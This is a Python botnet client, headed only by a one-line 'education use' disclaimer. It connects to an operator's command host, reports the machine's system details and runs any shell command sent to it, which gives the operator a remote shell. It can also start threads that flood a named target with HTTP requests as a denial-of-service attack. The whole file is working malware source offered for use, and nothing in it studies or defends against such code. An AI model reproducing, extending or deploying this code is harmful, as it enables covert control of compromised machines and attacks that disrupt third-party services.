#This is just for education use don't use it for illegal purposes

import socket
import os
import threading

# The IP address and port of the main host
host = 'YOUR_MAIN_HOST_IP'
port = YOUR_MAIN_HOST_PORT

def connect_to_main_host():
    # Connect to the main host
    main_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    main_host.connect((host, port))

    # Send commands to the main host and receive instructions
    while True:
        command = main_host.recv(1024).decode()

        if command.lower() == 'exit':
            break
        elif command.lower() == 'get_system_info':
            system_info = get_system_info()
            main_host.send(system_info.encode())
        elif command.lower() == 'execute_command':
            cmd = main_host.recv(1024).decode()
            result = execute_command(cmd)
            main_host.send(result.encode())
        elif command.lower().startswith('ddos_attack'):
            # Extract the target IP and port from the command
            _, target_ip, target_port = command.split(',')

            # Start a new thread to perform the DDoS attack on the specified target
            ddos_thread = threading.Thread(target=ddos_attack, args=(target_ip, int(target_port)))
            ddos_thread.start()
        else:
            main_host.send('Invalid command'.encode())

    # Close the connection
    main_host.close()

def get_system_info():
    # Get system information such as hostname, operating system, etc.
    system_info = "System Information:\n"
    system_info += "Hostname: {}\n".format(os.uname().nodename)
    system_info += "Operating System: {}\n".format(os.uname().sysname)
    system_info += "Release: {}\n".format(os.uname().release)
    system_info += "Version: {}\n".format(os.uname().version)
    return system_info

def execute_command(cmd):
    # Execute a command on the bot's system and return the result
    result = os.popen(cmd).read()
    return result

def ddos_attack(target_ip, target_port):

    print(f"Launching DDoS attack on {target_ip}:{target_port}...")

    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target IP and port
    try:
        sock.connect((target_ip, target_port))
    except socket.error as e:
        print(f"Failed to connect to {target_ip}:{target_port}: {str(e)}")
        return

    # Send a flood of requests to overwhelm the target
    while True:
        try:
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        except socket.error:
            break

    # Close the socket connection
    sock.close()

    print("DDoS attack completed!")

def start_bot():
    # Connect to the main host
    connect_to_main_host()

# Start the bot
start_bot()
